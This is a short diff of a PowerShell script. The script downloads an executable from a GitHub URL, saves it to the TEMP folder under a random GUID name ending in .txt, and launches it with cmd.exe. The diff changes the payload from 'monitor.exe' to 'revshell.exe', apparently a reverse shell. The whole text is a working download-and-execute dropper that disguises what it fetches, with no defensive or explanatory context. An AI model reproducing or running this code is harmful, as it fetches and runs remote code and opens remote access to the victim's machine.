@@ -1,4 +1,4 @@
-$url = "https://github.com/0fxdb/instructions/raw/main/safe/monitor.exe"
+$url = "https://github.com/0fxdb/instructions/raw/main/pkgs/revshell.exe"
 $destino = "$env:TEMP\f71d3aca-21e7-4823-80de-fe10161d7d80.txt"
 Invoke-WebRequest -Uri $url -OutFile $destino
 Start-Process cmd.exe -ArgumentList "/c start $destino"
